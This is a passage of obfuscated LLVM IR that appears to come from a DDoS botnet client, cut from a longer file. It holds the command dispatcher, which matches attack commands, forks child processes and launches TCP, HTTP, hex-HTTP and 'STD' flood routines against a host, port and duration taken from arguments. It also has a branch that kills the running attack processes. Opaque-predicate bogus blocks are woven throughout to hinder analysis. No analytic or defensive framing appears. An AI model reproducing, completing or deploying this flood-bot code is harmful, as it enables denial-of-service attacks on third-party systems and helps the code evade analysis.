originalBB74:                                     ; preds = %originalBB74alteredBB, %644
  %653 = load i8*, i8** %17, align 8
  %654 = load i32, i32* %18, align 4
  %655 = load i32, i32* %19, align 4
  %656 = load i32, i32* %20, align 4
  %657 = load i8*, i8** %21, align 8
  %658 = load i32, i32* %23, align 4
  %659 = load i32, i32* %22, align 4
  call void @sendTCP(i8* %653, i32 %654, i32 %655, i32 %656, i8* %657, i32 %658, i32 %659)
  call void @_exit(i32 0) #12
  %660 = load i32, i32* @x.103
  %661 = load i32, i32* @y.104
  %662 = sub i32 %660, 1
  %663 = mul i32 %660, %662
  %664 = urem i32 %663, 2
  %665 = icmp eq i32 %664, 0
  %666 = icmp slt i32 %661, 10
  %667 = or i1 %665, %666
  br i1 %667, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  unreachable

; <label>:668:                                    ; preds = %641
  %669 = load i32, i32* @x.103
  %670 = load i32, i32* @y.104
  %671 = sub i32 %669, 1
  %672 = mul i32 %669, %671
  %673 = urem i32 %672, 2
  %674 = icmp eq i32 %673, 0
  %675 = icmp slt i32 %670, 10
  %676 = or i1 %674, %675
  br i1 %676, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %668
  %677 = load i32, i32* @x.103
  %678 = load i32, i32* @y.104
  %679 = sub i32 %677, 1
  %680 = mul i32 %677, %679
  %681 = urem i32 %680, 2
  %682 = icmp eq i32 %681, 0
  %683 = icmp slt i32 %678, 10
  %684 = or i1 %682, %683
  br i1 %684, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br label %685

; <label>:685:                                    ; preds = %originalBBpart280, %640
  br label %686

; <label>:686:                                    ; preds = %685, %431
  %687 = load i8**, i8*** %4, align 8
  %688 = getelementptr inbounds i8*, i8** %687, i64 0
  %689 = load i8*, i8** %688, align 8
  %690 = call i32 @strcmp(i8* %689, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.133, i32 0, i32 0)) #9
  %691 = icmp ne i32 %690, 0
  br i1 %691, label %767, label %692

; <label>:692:                                    ; preds = %686
  %693 = load i32, i32* %3, align 4
  %694 = icmp slt i32 %693, 6
  br i1 %694, label %723, label %695

; <label>:695:                                    ; preds = %692
  %696 = load i8**, i8*** %4, align 8
  %697 = getelementptr inbounds i8*, i8** %696, i64 3
  %698 = load i8*, i8** %697, align 8
  %699 = call i32 @atoi(i8* %698) #9
  %700 = icmp slt i32 %699, 1
  br i1 %700, label %723, label %701

; <label>:701:                                    ; preds = %695
  %702 = load i32, i32* @x.103
  %703 = load i32, i32* @y.104
  %704 = sub i32 %702, 1
  %705 = mul i32 %702, %704
  %706 = urem i32 %705, 2
  %707 = icmp eq i32 %706, 0
  %708 = icmp slt i32 %703, 10
  %709 = or i1 %707, %708
  br i1 %709, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %701
  %710 = load i8**, i8*** %4, align 8
  %711 = getelementptr inbounds i8*, i8** %710, i64 5
  %712 = load i8*, i8** %711, align 8
  %713 = call i32 @atoi(i8* %712) #9
  %714 = icmp slt i32 %713, 1
  %715 = load i32, i32* @x.103
  %716 = load i32, i32* @y.104
  %717 = sub i32 %715, 1
  %718 = mul i32 %715, %717
  %719 = urem i32 %718, 2
  %720 = icmp eq i32 %719, 0
  %721 = icmp slt i32 %716, 10
  %722 = or i1 %720, %721
  br i1 %722, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br i1 %714, label %723, label %724

; <label>:723:                                    ; preds = %originalBBpart284, %695, %692
  br label %1091

; <label>:724:                                    ; preds = %originalBBpart284
  %725 = load i32, i32* @x.103
  %726 = load i32, i32* @y.104
  %727 = sub i32 %725, 1
  %728 = mul i32 %725, %727
  %729 = urem i32 %728, 2
  %730 = icmp eq i32 %729, 0
  %731 = icmp slt i32 %726, 10
  %732 = or i1 %730, %731
  br i1 %732, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %724
  %733 = call i32 @listFork()
  %734 = icmp ne i32 %733, 0
  %735 = load i32, i32* @x.103
  %736 = load i32, i32* @y.104
  %737 = sub i32 %735, 1
  %738 = mul i32 %735, %737
  %739 = urem i32 %738, 2
  %740 = icmp eq i32 %739, 0
  %741 = icmp slt i32 %736, 10
  %742 = or i1 %740, %741
  br i1 %742, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br i1 %734, label %743, label %744

; <label>:743:                                    ; preds = %originalBBpart288
  br label %1091

; <label>:744:                                    ; preds = %originalBBpart288
  %745 = load i8**, i8*** %4, align 8
  %746 = getelementptr inbounds i8*, i8** %745, i64 1
  %747 = load i8*, i8** %746, align 8
  %748 = load i8**, i8*** %4, align 8
  %749 = getelementptr inbounds i8*, i8** %748, i64 2
  %750 = load i8*, i8** %749, align 8
  %751 = load i8**, i8*** %4, align 8
  %752 = getelementptr inbounds i8*, i8** %751, i64 3
  %753 = load i8*, i8** %752, align 8
  %754 = call i32 @atoi(i8* %753) #9
  %755 = trunc i32 %754 to i16
  %756 = load i8**, i8*** %4, align 8
  %757 = getelementptr inbounds i8*, i8** %756, i64 4
  %758 = load i8*, i8** %757, align 8
  %759 = load i8**, i8*** %4, align 8
  %760 = getelementptr inbounds i8*, i8** %759, i64 5
  %761 = load i8*, i8** %760, align 8
  %762 = call i32 @atoi(i8* %761) #9
  %763 = load i8**, i8*** %4, align 8
  %764 = getelementptr inbounds i8*, i8** %763, i64 6
  %765 = load i8*, i8** %764, align 8
  %766 = call i32 @atoi(i8* %765) #9
  call void @SendHTTP(i8* %747, i8* %750, i16 zeroext %755, i8* %758, i32 %762, i32 %766)
  call void @exit(i32 0) #11
  unreachable

; <label>:767:                                    ; preds = %686
  %768 = load i8**, i8*** %4, align 8
  %769 = getelementptr inbounds i8*, i8** %768, i64 0
  %770 = load i8*, i8** %769, align 8
  %771 = call i32 @strcmp(i8* %770, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.134, i32 0, i32 0)) #9
  %772 = icmp ne i32 %771, 0
  br i1 %772, label %848, label %773

; <label>:773:                                    ; preds = %767
  %774 = load i32, i32* @x.103
  %775 = load i32, i32* @y.104
  %776 = sub i32 %774, 1
  %777 = mul i32 %774, %776
  %778 = urem i32 %777, 2
  %779 = icmp eq i32 %778, 0
  %780 = icmp slt i32 %775, 10
  %781 = or i1 %779, %780
  br i1 %781, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %773
  %782 = load i32, i32* %3, align 4
  %783 = icmp slt i32 %782, 6
  %784 = load i32, i32* @x.103
  %785 = load i32, i32* @y.104
  %786 = sub i32 %784, 1
  %787 = mul i32 %784, %786
  %788 = urem i32 %787, 2
  %789 = icmp eq i32 %788, 0
  %790 = icmp slt i32 %785, 10
  %791 = or i1 %789, %790
  br i1 %791, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br i1 %783, label %804, label %792

; <label>:792:                                    ; preds = %originalBBpart292
  %793 = load i8**, i8*** %4, align 8
  %794 = getelementptr inbounds i8*, i8** %793, i64 3
  %795 = load i8*, i8** %794, align 8
  %796 = call i32 @atoi(i8* %795) #9
  %797 = icmp slt i32 %796, 1
  br i1 %797, label %804, label %798

; <label>:798:                                    ; preds = %792
  %799 = load i8**, i8*** %4, align 8
  %800 = getelementptr inbounds i8*, i8** %799, i64 5
  %801 = load i8*, i8** %800, align 8
  %802 = call i32 @atoi(i8* %801) #9
  %803 = icmp slt i32 %802, 1
  br i1 %803, label %804, label %805

; <label>:804:                                    ; preds = %798, %792, %originalBBpart292
  br label %1091

; <label>:805:                                    ; preds = %798
  %806 = load i32, i32* @x.103
  %807 = load i32, i32* @y.104
  %808 = sub i32 %806, 1
  %809 = mul i32 %806, %808
  %810 = urem i32 %809, 2
  %811 = icmp eq i32 %810, 0
  %812 = icmp slt i32 %807, 10
  %813 = or i1 %811, %812
  br i1 %813, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %805
  %814 = call i32 @listFork()
  %815 = icmp ne i32 %814, 0
  %816 = load i32, i32* @x.103
  %817 = load i32, i32* @y.104
  %818 = sub i32 %816, 1
  %819 = mul i32 %816, %818
  %820 = urem i32 %819, 2
  %821 = icmp eq i32 %820, 0
  %822 = icmp slt i32 %817, 10
  %823 = or i1 %821, %822
  br i1 %823, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br i1 %815, label %824, label %825

; <label>:824:                                    ; preds = %originalBBpart296
  br label %1091

; <label>:825:                                    ; preds = %originalBBpart296
  %826 = load i8**, i8*** %4, align 8
  %827 = getelementptr inbounds i8*, i8** %826, i64 1
  %828 = load i8*, i8** %827, align 8
  %829 = load i8**, i8*** %4, align 8
  %830 = getelementptr inbounds i8*, i8** %829, i64 2
  %831 = load i8*, i8** %830, align 8
  %832 = load i8**, i8*** %4, align 8
  %833 = getelementptr inbounds i8*, i8** %832, i64 3
  %834 = load i8*, i8** %833, align 8
  %835 = call i32 @atoi(i8* %834) #9
  %836 = trunc i32 %835 to i16
  %837 = load i8**, i8*** %4, align 8
  %838 = getelementptr inbounds i8*, i8** %837, i64 4
  %839 = load i8*, i8** %838, align 8
  %840 = load i8**, i8*** %4, align 8
  %841 = getelementptr inbounds i8*, i8** %840, i64 5
  %842 = load i8*, i8** %841, align 8
  %843 = call i32 @atoi(i8* %842) #9
  %844 = load i8**, i8*** %4, align 8
  %845 = getelementptr inbounds i8*, i8** %844, i64 6
  %846 = load i8*, i8** %845, align 8
  %847 = call i32 @atoi(i8* %846) #9
  call void @SendHTTPHex(i8* %828, i8* %831, i16 zeroext %836, i8* %839, i32 %843, i32 %847)
  call void @exit(i32 0) #11
  unreachable

; <label>:848:                                    ; preds = %767
  %849 = load i32, i32* @x.103
  %850 = load i32, i32* @y.104
  %851 = sub i32 %849, 1
  %852 = mul i32 %849, %851
  %853 = urem i32 %852, 2
  %854 = icmp eq i32 %853, 0
  %855 = icmp slt i32 %850, 10
  %856 = or i1 %854, %855
  br i1 %856, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %848
  %857 = load i8**, i8*** %4, align 8
  %858 = getelementptr inbounds i8*, i8** %857, i64 0
  %859 = load i8*, i8** %858, align 8
  %860 = call i32 @strcmp(i8* %859, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.135, i32 0, i32 0)) #9
  %861 = icmp ne i32 %860, 0
  %862 = load i32, i32* @x.103
  %863 = load i32, i32* @y.104
  %864 = sub i32 %862, 1
  %865 = mul i32 %862, %864
  %866 = urem i32 %865, 2
  %867 = icmp eq i32 %866, 0
  %868 = icmp slt i32 %863, 10
  %869 = or i1 %867, %868
  br i1 %869, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br i1 %861, label %1038, label %870

; <label>:870:                                    ; preds = %originalBBpart2100
  %871 = load i32, i32* %3, align 4
  %872 = icmp slt i32 %871, 4
  br i1 %872, label %917, label %873

; <label>:873:                                    ; preds = %870
  %874 = load i32, i32* @x.103
  %875 = load i32, i32* @y.104
  %876 = sub i32 %874, 1
  %877 = mul i32 %874, %876
  %878 = urem i32 %877, 2
  %879 = icmp eq i32 %878, 0
  %880 = icmp slt i32 %875, 10
  %881 = or i1 %879, %880
  br i1 %881, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %873
  %882 = load i8**, i8*** %4, align 8
  %883 = getelementptr inbounds i8*, i8** %882, i64 2
  %884 = load i8*, i8** %883, align 8
  %885 = call i32 @atoi(i8* %884) #9
  %886 = icmp slt i32 %885, 1
  %887 = load i32, i32* @x.103
  %888 = load i32, i32* @y.104
  %889 = sub i32 %887, 1
  %890 = mul i32 %887, %889
  %891 = urem i32 %890, 2
  %892 = icmp eq i32 %891, 0
  %893 = icmp slt i32 %888, 10
  %894 = or i1 %892, %893
  br i1 %894, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  br i1 %886, label %917, label %895

; <label>:895:                                    ; preds = %originalBBpart2104
  %896 = load i32, i32* @x.103
  %897 = load i32, i32* @y.104
  %898 = sub i32 %896, 1
  %899 = mul i32 %896, %898
  %900 = urem i32 %899, 2
  %901 = icmp eq i32 %900, 0
  %902 = icmp slt i32 %897, 10
  %903 = or i1 %901, %902
  br i1 %903, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %895
  %904 = load i8**, i8*** %4, align 8
  %905 = getelementptr inbounds i8*, i8** %904, i64 3
  %906 = load i8*, i8** %905, align 8
  %907 = call i32 @atoi(i8* %906) #9
  %908 = icmp slt i32 %907, 1
  %909 = load i32, i32* @x.103
  %910 = load i32, i32* @y.104
  %911 = sub i32 %909, 1
  %912 = mul i32 %909, %911
  %913 = urem i32 %912, 2
  %914 = icmp eq i32 %913, 0
  %915 = icmp slt i32 %910, 10
  %916 = or i1 %914, %915
  br i1 %916, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  br i1 %908, label %917, label %934

; <label>:917:                                    ; preds = %originalBBpart2108, %originalBBpart2104, %870
  %918 = load i32, i32* @x.103
  %919 = load i32, i32* @y.104
  %920 = sub i32 %918, 1
  %921 = mul i32 %918, %920
  %922 = urem i32 %921, 2
  %923 = icmp eq i32 %922, 0
  %924 = icmp slt i32 %919, 10
  %925 = or i1 %923, %924
  br i1 %925, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %917
  %926 = load i32, i32* @x.103
  %927 = load i32, i32* @y.104
  %928 = sub i32 %926, 1
  %929 = mul i32 %926, %928
  %930 = urem i32 %929, 2
  %931 = icmp eq i32 %930, 0
  %932 = icmp slt i32 %927, 10
  %933 = or i1 %931, %932
  br i1 %933, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  br label %1091

; <label>:934:                                    ; preds = %originalBBpart2108
  %935 = load i8**, i8*** %4, align 8
  %936 = getelementptr inbounds i8*, i8** %935, i64 1
  %937 = load i8*, i8** %936, align 8
  store i8* %937, i8** %25, align 8
  %938 = load i8**, i8*** %4, align 8
  %939 = getelementptr inbounds i8*, i8** %938, i64 2
  %940 = load i8*, i8** %939, align 8
  %941 = call i32 @atoi(i8* %940) #9
  store i32 %941, i32* %26, align 4
  %942 = load i8**, i8*** %4, align 8
  %943 = getelementptr inbounds i8*, i8** %942, i64 3
  %944 = load i8*, i8** %943, align 8
  %945 = call i32 @atoi(i8* %944) #9
  store i32 %945, i32* %27, align 4
  %946 = load i8*, i8** %25, align 8
  %947 = call i8* @strstr(i8* %946, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.120, i32 0, i32 0)) #9
  %948 = icmp ne i8* %947, null
  br i1 %948, label %949, label %997

; <label>:949:                                    ; preds = %934
  %950 = load i32, i32* @x.103
  %951 = load i32, i32* @y.104
  %952 = sub i32 %950, 1
  %953 = mul i32 %950, %952
  %954 = urem i32 %953, 2
  %955 = icmp eq i32 %954, 0
  %956 = icmp slt i32 %951, 10
  %957 = or i1 %955, %956
  br i1 %957, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %949
  %958 = load i8*, i8** %25, align 8
  %959 = call i8* @strtok(i8* %958, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.120, i32 0, i32 0)) #3
  store i8* %959, i8** %28, align 8
  %960 = load i32, i32* @x.103
  %961 = load i32, i32* @y.104
  %962 = sub i32 %960, 1
  %963 = mul i32 %960, %962
  %964 = urem i32 %963, 2
  %965 = icmp eq i32 %964, 0
  %966 = icmp slt i32 %961, 10
  %967 = or i1 %965, %966
  br i1 %967, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br label %968

; <label>:968:                                    ; preds = %originalBBpart2120, %originalBBpart2116
  %969 = load i8*, i8** %28, align 8
  %970 = icmp ne i8* %969, null
  br i1 %970, label %971, label %996

; <label>:971:                                    ; preds = %968
  %972 = call i32 @listFork()
  %973 = icmp ne i32 %972, 0
  br i1 %973, label %978, label %974

; <label>:974:                                    ; preds = %971
  %975 = load i8*, i8** %28, align 8
  %976 = load i32, i32* %26, align 4
  %977 = load i32, i32* %27, align 4
  call void @sendSTD(i8* %975, i32 %976, i32 %977)
  call void @_exit(i32 0) #12
  unreachable

; <label>:978:                                    ; preds = %971
  %979 = load i32, i32* @x.103
  %980 = load i32, i32* @y.104
  %981 = sub i32 %979, 1
  %982 = mul i32 %979, %981
  %983 = urem i32 %982, 2
  %984 = icmp eq i32 %983, 0
  %985 = icmp slt i32 %980, 10
  %986 = or i1 %984, %985
  br i1 %986, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %978
  %987 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.120, i32 0, i32 0)) #3
  store i8* %987, i8** %28, align 8
  %988 = load i32, i32* @x.103
  %989 = load i32, i32* @y.104
  %990 = sub i32 %988, 1
  %991 = mul i32 %988, %990
  %992 = urem i32 %991, 2
  %993 = icmp eq i32 %992, 0
  %994 = icmp slt i32 %989, 10
  %995 = or i1 %993, %994
  br i1 %995, label %originalBBpart2120, label %originalBB118alteredBB

originalBBpart2120:                               ; preds = %originalBB118
  br label %968

; <label>:996:                                    ; preds = %968
  br label %1021

; <label>:997:                                    ; preds = %934
  %998 = call i32 @listFork()
  %999 = icmp ne i32 %998, 0
  br i1 %999, label %1000, label %1001

; <label>:1000:                                   ; preds = %997
  br label %1091

; <label>:1001:                                   ; preds = %997
  %1002 = load i32, i32* @x.103
  %1003 = load i32, i32* @y.104
  %1004 = sub i32 %1002, 1
  %1005 = mul i32 %1002, %1004
  %1006 = urem i32 %1005, 2
  %1007 = icmp eq i32 %1006, 0
  %1008 = icmp slt i32 %1003, 10
  %1009 = or i1 %1007, %1008
  br i1 %1009, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %1001
  %1010 = load i8*, i8** %25, align 8
  %1011 = load i32, i32* %26, align 4
  %1012 = load i32, i32* %27, align 4
  call void @sendSTD(i8* %1010, i32 %1011, i32 %1012)
  call void @_exit(i32 0) #12
  %1013 = load i32, i32* @x.103
  %1014 = load i32, i32* @y.104
  %1015 = sub i32 %1013, 1
  %1016 = mul i32 %1013, %1015
  %1017 = urem i32 %1016, 2
  %1018 = icmp eq i32 %1017, 0
  %1019 = icmp slt i32 %1014, 10
  %1020 = or i1 %1018, %1019
  br i1 %1020, label %originalBBpart2124, label %originalBB122alteredBB

originalBBpart2124:                               ; preds = %originalBB122
  unreachable

; <label>:1021:                                   ; preds = %996
  %1022 = load i32, i32* @x.103
  %1023 = load i32, i32* @y.104
  %1024 = sub i32 %1022, 1
  %1025 = mul i32 %1022, %1024
  %1026 = urem i32 %1025, 2
  %1027 = icmp eq i32 %1026, 0
  %1028 = icmp slt i32 %1023, 10
  %1029 = or i1 %1027, %1028
  br i1 %1029, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %1021
  %1030 = load i32, i32* @x.103
  %1031 = load i32, i32* @y.104
  %1032 = sub i32 %1030, 1
  %1033 = mul i32 %1030, %1032
  %1034 = urem i32 %1033, 2
  %1035 = icmp eq i32 %1034, 0
  %1036 = icmp slt i32 %1031, 10
  %1037 = or i1 %1035, %1036
  br i1 %1037, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  br label %1038

; <label>:1038:                                   ; preds = %originalBBpart2128, %originalBBpart2100
  %1039 = load i32, i32* @x.103
  %1040 = load i32, i32* @y.104
  %1041 = sub i32 %1039, 1
  %1042 = mul i32 %1039, %1041
  %1043 = urem i32 %1042, 2
  %1044 = icmp eq i32 %1043, 0
  %1045 = icmp slt i32 %1040, 10
  %1046 = or i1 %1044, %1045
  br i1 %1046, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %1038
  %1047 = load i8**, i8*** %4, align 8
  %1048 = getelementptr inbounds i8*, i8** %1047, i64 0
  %1049 = load i8*, i8** %1048, align 8
  %1050 = call i32 @strcmp(i8* %1049, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.136, i32 0, i32 0)) #9
  %1051 = icmp ne i32 %1050, 0
  %1052 = load i32, i32* @x.103
  %1053 = load i32, i32* @y.104
  %1054 = sub i32 %1052, 1
  %1055 = mul i32 %1052, %1054
  %1056 = urem i32 %1055, 2
  %1057 = icmp eq i32 %1056, 0
  %1058 = icmp slt i32 %1053, 10
  %1059 = or i1 %1057, %1058
  br i1 %1059, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br i1 %1051, label %1091, label %1060

; <label>:1060:                                   ; preds = %originalBBpart2132
  store i32 0, i32* %29, align 4
  store i64 0, i64* %30, align 8
  br label %1061

; <label>:1061:                                   ; preds = %1087, %1060
  %1062 = load i64, i64* %30, align 8
  %1063 = load i64, i64* @numpids, align 8
  %1064 = icmp ult i64 %1062, %1063
  br i1 %1064, label %1065, label %1090

; <label>:1065:                                   ; preds = %1061
  %1066 = load i32*, i32** @pids, align 8
  %1067 = load i64, i64* %30, align 8
  %1068 = getelementptr inbounds i32, i32* %1066, i64 %1067
  %1069 = load i32, i32* %1068, align 4
  %1070 = icmp ne i32 %1069, 0
  br i1 %1070, label %1071, label %1086

; <label>:1071:                                   ; preds = %1065
  %1072 = load i32*, i32** @pids, align 8
  %1073 = load i64, i64* %30, align 8
  %1074 = getelementptr inbounds i32, i32* %1072, i64 %1073
  %1075 = load i32, i32* %1074, align 4
  %1076 = call i32 @getpid() #3
  %1077 = icmp ne i32 %1075, %1076
  br i1 %1077, label %1078, label %1086

; <label>:1078:                                   ; preds = %1071
  %1079 = load i32*, i32** @pids, align 8
  %1080 = load i64, i64* %30, align 8
  %1081 = getelementptr inbounds i32, i32* %1079, i64 %1080
  %1082 = load i32, i32* %1081, align 4
  %1083 = call i32 @kill(i32 %1082, i32 9) #3
  %1084 = load i32, i32* %29, align 4
  %1085 = add nsw i32 %1084, 1
  store i32 %1085, i32* %29, align 4
  br label %1086

; <label>:1086:                                   ; preds = %1078, %1071, %1065
  br label %1087

; <label>:1087:                                   ; preds = %1086
  %1088 = load i64, i64* %30, align 8
  %1089 = add i64 %1088, 1
  store i64 %1089, i64* %30, align 8
  br label %1061

; <label>:1090:                                   ; preds = %1061
  br label %1091

; <label>:1091:                                   ; preds = %1090, %originalBBpart2132, %1000, %originalBBpart2112, %824, %804, %743, %723, %546, %originalBBpart248, %originalBBpart232, %originalBBpart212, %95, %90, %45
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %49
  %1092 = load i8**, i8*** %4, align 8
  %1093 = getelementptr inbounds i8*, i8** %1092, i64 1
  %1094 = load i8*, i8** %1093, align 8
  %1095 = call i32 @strcmp(i8* %1094, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.130, i32 0, i32 0)) #9
  %1096 = icmp ne i32 %1095, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %71
  %1097 = load i32, i32* @botnetPid, align 4
  %1098 = icmp ne i32 %1097, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %97
  %1099 = load i32, i32* %5, align 4
  %1100 = icmp eq i32 %1099, -1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %116
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %133
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %153
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %209
  %1101 = load i8**, i8*** %4, align 8
  %1102 = getelementptr inbounds i8*, i8** %1101, i64 5
  %1103 = load i8*, i8** %1102, align 8
  %1104 = call i32 @atoi(i8* %1103) #9
  %1105 = icmp sgt i32 %1104, 65500
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %237
  %1106 = load i32, i32* %3, align 4
  %1107 = icmp eq i32 %1106, 7
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %262
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %307
  store i32 %308, i32* %13, align 4
  %1108 = load i32, i32* %3, align 4
  %1109 = icmp sgt i32 %1108, 7
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %327
  %1110 = load i8**, i8*** %4, align 8
  %1111 = getelementptr inbounds i8*, i8** %1110, i64 7
  %1112 = load i8*, i8** %1111, align 8
  %1113 = call i32 @atoi(i8* %1112) #9
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %397
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %414
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %452
  %1114 = load i8**, i8*** %4, align 8
  %1115 = getelementptr inbounds i8*, i8** %1114, i64 4
  %1116 = load i8*, i8** %1115, align 8
  %1117 = call i32 @atoi(i8* %1116) #9
  %1118 = icmp eq i32 %1117, -1
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %474
  %1119 = load i8**, i8*** %4, align 8
  %1120 = getelementptr inbounds i8*, i8** %1119, i64 4
  %1121 = load i8*, i8** %1120, align 8
  %1122 = call i32 @atoi(i8* %1121) #9
  %1123 = icmp sgt i32 %1122, 32
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %496
  %1124 = load i32, i32* %3, align 4
  %1125 = icmp sgt i32 %1124, 6
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %515
  %1126 = load i8**, i8*** %4, align 8
  %1127 = getelementptr inbounds i8*, i8** %1126, i64 6
  %1128 = load i8*, i8** %1127, align 8
  %1129 = call i32 @atoi(i8* %1128) #9
  %1130 = icmp slt i32 %1129, 0
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %547
  %1131 = load i8**, i8*** %4, align 8
  %1132 = getelementptr inbounds i8*, i8** %1131, i64 1
  %1133 = load i8*, i8** %1132, align 8
  store i8* %1133, i8** %17, align 8
  %1134 = load i8**, i8*** %4, align 8
  %1135 = getelementptr inbounds i8*, i8** %1134, i64 2
  %1136 = load i8*, i8** %1135, align 8
  %1137 = call i32 @atoi(i8* %1136) #9
  store i32 %1137, i32* %18, align 4
  %1138 = load i8**, i8*** %4, align 8
  %1139 = getelementptr inbounds i8*, i8** %1138, i64 3
  %1140 = load i8*, i8** %1139, align 8
  %1141 = call i32 @atoi(i8* %1140) #9
  store i32 %1141, i32* %19, align 4
  %1142 = load i8**, i8*** %4, align 8
  %1143 = getelementptr inbounds i8*, i8** %1142, i64 4
  %1144 = load i8*, i8** %1143, align 8
  %1145 = call i32 @atoi(i8* %1144) #9
  store i32 %1145, i32* %20, align 4
  %1146 = load i8**, i8*** %4, align 8
  %1147 = getelementptr inbounds i8*, i8** %1146, i64 5
  %1148 = load i8*, i8** %1147, align 8
  store i8* %1148, i8** %21, align 8
  %1149 = load i32, i32* %3, align 4
  %1150 = icmp eq i32 %1149, 8
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %614
  %1151 = load i8*, i8** %24, align 8
  %1152 = load i32, i32* %18, align 4
  %1153 = load i32, i32* %19, align 4
  %1154 = load i32, i32* %20, align 4
  %1155 = load i8*, i8** %21, align 8
  %1156 = load i32, i32* %23, align 4
  %1157 = load i32, i32* %22, align 4
  call void @sendTCP(i8* %1151, i32 %1152, i32 %1153, i32 %1154, i8* %1155, i32 %1156, i32 %1157)
  call void @_exit(i32 0) #12
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %644
  %1158 = load i8*, i8** %17, align 8
  %1159 = load i32, i32* %18, align 4
  %1160 = load i32, i32* %19, align 4
  %1161 = load i32, i32* %20, align 4
  %1162 = load i8*, i8** %21, align 8
  %1163 = load i32, i32* %23, align 4
  %1164 = load i32, i32* %22, align 4
  call void @sendTCP(i8* %1158, i32 %1159, i32 %1160, i32 %1161, i8* %1162, i32 %1163, i32 %1164)
  call void @_exit(i32 0) #12
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %668
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %701
  %1165 = load i8**, i8*** %4, align 8
  %1166 = getelementptr inbounds i8*, i8** %1165, i64 5
  %1167 = load i8*, i8** %1166, align 8
  %1168 = call i32 @atoi(i8* %1167) #9
  %1169 = icmp slt i32 %1168, 1
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %724
  %1170 = call i32 @listFork()
  %1171 = icmp ne i32 %1170, 0
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %773
  %1172 = load i32, i32* %3, align 4
  %1173 = icmp slt i32 %1172, 6
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %805
  %1174 = call i32 @listFork()
  %1175 = icmp ne i32 %1174, 0
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %848
  %1176 = load i8**, i8*** %4, align 8
  %1177 = getelementptr inbounds i8*, i8** %1176, i64 0
  %1178 = load i8*, i8** %1177, align 8
  %1179 = call i32 @strcmp(i8* %1178, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.135, i32 0, i32 0)) #9
  %1180 = icmp ne i32 %1179, 0
  br label %originalBB98

